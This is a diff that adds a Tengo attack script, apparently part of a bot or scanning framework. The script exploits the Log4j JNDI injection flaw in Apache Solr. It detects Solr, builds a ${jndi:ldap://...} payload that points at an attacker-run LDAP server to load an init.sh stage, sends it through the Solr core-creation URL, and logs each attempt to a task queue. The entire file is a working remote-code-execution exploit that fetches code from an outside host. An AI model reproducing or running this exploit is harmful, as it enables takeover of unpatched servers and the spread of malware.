@@ -1,0 +1,101 @@
+/*
+* This log4j.tengo is an attack script that attacks target host by apache log4j jndi:ldap remote inject bugs
+*
+*global variable:
+*attackTarget
+*attackScript
+*/
+
+fmt  := import("fmt")
+http := import("http")
+json := import("json")
+text := import("text")
+attack := import("attack")
+
+ApacheLog4JAttackName := "ApacheLog4JRCEAttack"
+ApacheLog4JAttackType := "ApacheLog4JRCEAttack"
+AttackInitScriptName := "init.sh"
+
+UA := "GoClient"
+timeoutMS := 10000
+
+host := attackTarget.ip
+port := attackTarget.port
+proto := attackTarget.proto
+
+isSSL := proto == "https" ||port==443
+
+makeJndiCmd := func() {
+
+     attackInfo := attackScript.getAttackInfo(host,port,AttackInitScriptName)
+
+     sbotHost := attackScript.sbotHost
+
+     sbotLdapPort := attackScript.sbotJPort
+
+     return fmt.sprintf("${jndi:ldap://%s:%d/%s}",sbotHost,sbotLdapPort,attackInfo)
+}
+
+//make attack process and publish into attack tasks and send into sbot
+sendAttackResult := func(app,cmd) {
+
+    attackProcess := attack.newAttackProcess()
+    attackProcess.setIP(host)
+    attackProcess.setHost(host)
+    attackProcess.setPort(port)
+    attackProcess.setProto(isSSL?"https":"http")
+    attackProcess.setApp(app)
+    attackProcess.setName(ApacheLog4JAttackName)
+    attackProcess.setType(ApacheLog4JAttackType)
+    attackProcess.setStatus(0)
+    attackProcess.setPayload(cmd)
+    attackProcess.setResult("")
+    //attackProcess.setDetails("")
+
+    //publish attack process into attack tasks
+    attackScript.pubProcess(attackProcess)
+}
+
+
+//log4j inject for apache solr
+attackForSolr := func(httpApp,cmd) {
+
+    client := http.newHttpClient(host,httpApp.port,httpApp.isSSL,timeoutMS)
+    enCmd := http.urlEncode(cmd)
+
+    url := fmt.sprintf("/solr/admin/cores?action=CREATE&config=solrconfig.xml&dataDir=cbot&instanceDir=cbot&name=%s&schema=schema.xml&wt=json",enCmd)
+
+    request := http.newHttpRequest("get",url)
+
+    request.addHeader("User-Agent",UA)
+
+    request.addHeader("Accept","application/json, text/plain, */*")
+
+    client.send(request)
+
+}
+
+//log4j inject for apache flink
+
+AppMap := {
+    "solr":{"checkKey":"responseHeader","checkUrl":"/solr/admin/cores?wt=json","dport":8983,"status":200,"attack":attackForSolr}
+
+}
+
+
+main := func() {
+
+    for app,mm in AppMap {
+
+        httpApp := http.detectApp(host,port==0?mm["dport"]:port,mm["checkUrl"],mm["checkKey"],mm["status"],timeoutMS)
+
+        if httpApp.port!=0 {
+
+            cmd := makeJndiCmd()
+            mm["attack"](httpApp,cmd)
+        }
+    }
+
+}
+
+main()
